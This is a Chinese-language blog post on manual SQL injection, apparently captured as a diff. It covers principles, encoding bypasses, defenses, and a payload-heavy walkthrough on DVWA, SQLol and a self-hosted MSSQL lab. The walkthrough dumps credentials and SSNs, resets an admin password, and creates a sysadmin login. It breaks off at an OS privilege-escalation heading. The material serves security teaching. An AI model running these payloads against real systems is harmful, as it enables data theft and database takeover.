@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL注入," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="DiZai" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 SQL注入简介SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="分享一波手工SQL注入">
+<meta property="og:url" content="http://yoursite.com/2018/09/02/分享一波SQL注入/index.html">
+<meta property="og:site_name" content="DiZai">
+<meta property="og:description" content="0x01 SQL注入简介SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/SQL/51.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/52.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/53.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/54.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/55.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/56.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/57.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/58.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/59.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/60.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/61.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/62.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/63.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/64.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/65.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/66.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/67.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/68.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/69.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/70.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/71.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/72.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/73.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/74.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/75.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/76.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/77.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/78.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/79.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/80.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/81.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/82.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/83.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/84.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/85.png">
+<meta property="og:image" content="http://yoursite.com/images/SQL/86.png">
+<meta property="og:updated_time" content="2018-09-02T06:37:20.463Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="分享一波手工SQL注入">
+<meta name="twitter:description" content="0x01 SQL注入简介SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。">
+<meta name="twitter:image" content="http://yoursite.com/images/SQL/51.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/02/分享一波SQL注入/"/>
+
+
+
+
+
+  <title>分享一波手工SQL注入 | DiZai</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">DiZai</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Just do IT</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/02/分享一波SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="迪仔">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiZai">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">分享一波手工SQL注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-02T13:06:10+08:00">
+                2018-09-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,667
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"> 
+	 
+      
+
+      
+        <h2 id="0x01-SQL注入简介"><a href="#0x01-SQL注入简介" class="headerlink" title="0x01 SQL注入简介"></a>0x01 SQL注入简介</h2><p>SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。</p>
+<a id="more"></a>
+<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击</p>
+<p>SQL注入漏洞可读取/修改数据库中的库和表，获取用户的账号，密码，邮箱，联系方式，信用卡信息，修改产品价格，删除数据。修改权限，获取系统管理员权限，修改任意门文件，安装后门。</p>
+<h2 id="0x02-SQL注入原理"><a href="#0x02-SQL注入原理" class="headerlink" title="0x02 SQL注入原理"></a>0x02 SQL注入原理</h2><p><img src="/images/SQL/51.png" alt="upload successful"></p>
+<h3 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h3><p>程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行</p>
+<p>盲注：就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到执行。</p>
+<h3 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h3><p>利用BENCHMARK（）函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。</p>
+<p>Timing Attack是盲注的一种高级技巧</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>利用“用户自定义函数”的技巧，即UDF（User-Defined Functions）来执行命令。</p>
+<h2 id="0x03-编码注入方式"><a href="#0x03-编码注入方式" class="headerlink" title="0x03 编码注入方式"></a>0x03 编码注入方式</h2><p><strong>宽字节注入，这个是怎么回事呢？</strong></p>
+<p>在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。</p>
+<p>简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27  在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。</p>
+<p>那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。</p>
+<p>二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。</p>
+<p>我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。</p>
+<p>那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，</p>
+<p>这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.</p>
+<p>我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。</p>
+<h3 id="从漏洞类型区分可以分为三种类型："><a href="#从漏洞类型区分可以分为三种类型：" class="headerlink" title="从漏洞类型区分可以分为三种类型："></a>从漏洞类型区分可以分为三种类型：</h3><p><strong>1.可显</strong></p>
+<p>攻击者可以直接在当前界面内容中获取想要获得的内容。</p>
+<p><strong>2.报错</strong></p>
+<p>数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。</p>
+<p>所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。</p>
+<p><strong>3.盲注</strong></p>
+<p>数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。</p>
+<h2 id="0x04-SQL-注入漏洞挖掘方法"><a href="#0x04-SQL-注入漏洞挖掘方法" class="headerlink" title="0x04 SQL 注入漏洞挖掘方法"></a>0x04 SQL 注入漏洞挖掘方法</h2><p><strong>针对上面提到的利用漏洞方法，总结了以下的挖掘方法：</strong></p>
+<ol>
+<li>参数接收位置，检查是否有没过滤直接使用  _POST、$_COOKIE 参数的。</li>
+<li>SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。</li>
+<li>宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’)就行。</li>
+<li>二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。</li>
+</ol>
+<h2 id="0x05-正确的防御SQL注入"><a href="#0x05-正确的防御SQL注入" class="headerlink" title="0x05 正确的防御SQL注入"></a>0x05 正确的防御SQL注入</h2><p><strong>1、使用预编译语句，绑定变量。</strong></p>
+<p><strong>2、使用存储过程：使用安全的存储过程对抗SQL注入。</strong></p>
+<p><strong>3、检查数据类型</strong></p>
+<p><strong>4、使用安全函数</strong></p>
+<h2 id="0x06-SQL注入实战"><a href="#0x06-SQL注入实战" class="headerlink" title="0x06 SQL注入实战"></a>0x06 SQL注入实战</h2><h3 id="SQL注入一般流程"><a href="#SQL注入一般流程" class="headerlink" title="SQL注入一般流程"></a>SQL注入一般流程</h3><p><img src="/images/SQL/52.png" alt="upload successful"></p>
+<h3 id="DVWA之SQL注入篇"><a href="#DVWA之SQL注入篇" class="headerlink" title="DVWA之SQL注入篇"></a>DVWA之SQL注入篇</h3><p><strong>1、首先猜查询信息的列数</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1‘ order by 2 #</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/SQL/53.png" alt="upload successful"></p>
+<p><strong>2、获取数据库版本信息</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, (@@version); #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/54.png" alt="upload successful"></p>
+<p><strong>3、获取当前的数据库名称</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, (database()); #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/55.png" alt="upload successful"></p>
+<p><strong>4、获取数据库所有的库名称</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(schema_name) from information_schema.schemata #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/56.png" alt="upload successful"></p>
+<p><strong>5、获取数据库下表的名称</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/57.png" alt="upload successful"></p>
+<p><strong>6、获得表的字段</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/58.png" alt="upload successful"></p>
+<p><strong>7、下载数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/SQL/59.png" alt="upload successful"></p>
+<h3 id="MCIR-SQLol-Challenges-SQL注入"><a href="#MCIR-SQLol-Challenges-SQL注入" class="headerlink" title="MCIR SQLol Challenges SQL注入"></a>MCIR SQLol Challenges SQL注入</h3><h4 id="Challenge-0-Hello-world"><a href="#Challenge-0-Hello-world" class="headerlink" title="Challenge 0 - Hello, world!"></a><a href="http://mcir.pte.com/sqlol/challenges/challenge0.php" target="_blank" rel="noopener">Challenge 0</a> - Hello, world!</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or 1=1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/60.png" alt="upload successful"></p>
+<h4 id="Challenge-1-SQL-Injection-101"><a href="#Challenge-1-SQL-Injection-101" class="headerlink" title="Challenge 1 - SQL Injection 101"></a><a href="http://mcir.pte.com/sqlol/challenges/challenge1.php" target="_blank" rel="noopener">Challenge 1</a> - SQL Injection 101</h4><p><strong>题意是找到social security present表并提取出该表的所有信息。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 1#   //猜列数</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/61.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select database() #     //查询当前数据库</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/62.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat_ws(char(32,58,32),user(),database(),version()) #       //  _ws(char(32,58,32) 表示空格冒号空格</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/63.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/SQL/64.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/65.png" alt="upload successful"></p>
+<h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><p><strong>题意是过滤掉了单引号然后要实现Challenge1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/66.png" alt="upload successful"></p>
+<h4 id="Challenge-3-Death-Row"><a href="#Challenge-3-Death-Row" class="headerlink" title="Challenge 3 - Death Row"></a>Challenge 3 - Death Row</h4><p><strong>与Challenge1类似但要求是一次只返回一行的结果</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat(name,&apos; &apos; ,ssn) from ssn limit 1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/67.png" alt="upload successful"></p>
+<p>接下来的以此类推。</p>
+<h5 id="Challenge-4-War-on-Error"><a href="#Challenge-4-War-on-Error" class="headerlink" title="Challenge 4 - War on Error"></a>Challenge 4 - War on Error</h5><p><strong>题意是results出没有显示内容，但查询结果在errors处显示出来。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(&apos;junk&apos;,concat(0x01,(SELECT concat(name,&apos; &apos;,ssn) FROM ssn limit 0,1),0x20),1) #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/68.png" alt="upload successful"></p>
+<h4 id="Challenge-5-Blind-Luck"><a href="#Challenge-5-Blind-Luck" class="headerlink" title="Challenge 5 - Blind Luck"></a>Challenge 5 - Blind Luck</h4><p><strong>sql盲注，没有错误提示</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select user()),1,1)) = 112 #     ---112是P</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/69.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select user()),2,1)) = 116 #    116---代表的是t</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/70.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt;= 115 #</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/71.png" alt="upload successful"></p>
+<p>接着试&gt;=116  发现没有出现Got resultst说明第一个表名的第一个字母为s。</p>
+<h3 id="自搭MSSQL注入环境"><a href="#自搭MSSQL注入环境" class="headerlink" title="自搭MSSQL注入环境"></a>自搭MSSQL注入环境</h3><h4 id="启动vm2003"><a href="#启动vm2003" class="headerlink" title="启动vm2003"></a>启动vm2003</h4><p>1.开始–程序–mssqlserver-服务管理器–服务启动</p>
+<p>2.iis服务管理器-网站–wenzhang:主机头，启动</p>
+<p><img src="/images/SQL/72.png" alt="upload successful"></p>
+<p><img src="/images/SQL/73.png" alt="upload successful"></p>
+<p>浏览器输入192.168.2.5访问wenzhang网站，在点击导读，然后里面存在注入点。</p>
+<p><img src="/images/SQL/74.png" alt="upload successful"></p>
+<p><a href="http://192.168.2.5/list.asp?id=1" target="_blank" rel="noopener">http://192.168.2.5/list.asp?id=1</a></p>
+<p><strong>1.判断数据库类型</strong>：<br>‘<br>and (select count(*) from 独有表)&gt;0<br>oracle:dual<br>mssql:sysobjects<br>mysql:shema<br>access:mssysobjects</p>
+<p><strong>2.判断版本号：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p>
+<p>Microsoft SQL Server 2000    Windows NT 5.2</p>
+<p>NT 5.0:windows 2000</p>
+<p>NT 5.2:Windows 2003 </p>
+<p>NT 6.1:windows7 sp</p>
+<p><img src="/images/SQL/75.png" alt="upload successful"></p>
+<p><strong>3.当前连接数据库的用户：dbo=sa</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and user&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/76.png" alt="upload successful"></p>
+<p><strong>4.判断当前连接的数据库：article</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/77.png" alt="upload successful"></p>
+<p><strong>5.判断其它数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select name from master..sysdatabases where dbid=6)&gt;0</span><br></pre></td></tr></table></figure>
+<p>dbid的值可以从1-6选择，会爆出相应的项。</p>
+<p><img src="/images/SQL/78.png" alt="upload successful"></p>
+<p><strong>6.判断表：’t_jiaozhu’</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/79.png" alt="upload successful"></p>
+<p><strong>7.判断其它表：admin</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0 and name not in(&apos;t_jiaozhu&apos;,&apos;Aclass&apos;))&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/80.png" alt="upload successful"></p>
+<p><strong>8.判断列名：admin(usernae,password)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/81.png" alt="upload successful"></p>
+<p><strong>9.判断值</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select username from admin)&gt;0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/82.png" alt="upload successful"></p>
+<p><strong>10.修改密码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--    #将admin的密码改成cccccc</span><br><span class="line">and (select password from admin)&gt;0   #检测是否更改成功</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/83.png" alt="upload successful"></p>
+<p><strong>11.添加数据库的用户；</strong></p>
+<p>（1）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addlogin hyd,888888;--</span><br></pre></td></tr></table></figure></p>
+<p>（2）查看vm2003中：开始–程序–mssqlserver–企业管理器–安全性–登录</p>
+<p><img src="/images/SQL/84.png" alt="upload successful"></p>
+<p>（3）提权：把hyd加入sysadmin组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addsrvrolemember hyd,sysadmin;--</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/85.png" alt="upload successful"></p>
+<p>4.利用：数据库连接工具：查询分析器,navicat:</p>
+<h4 id="操作系统提权"><a href="#操作系统提权" class="headerlink" title="操作系统提权"></a>操作系统提权</h4><p>1.新建用户:</p>
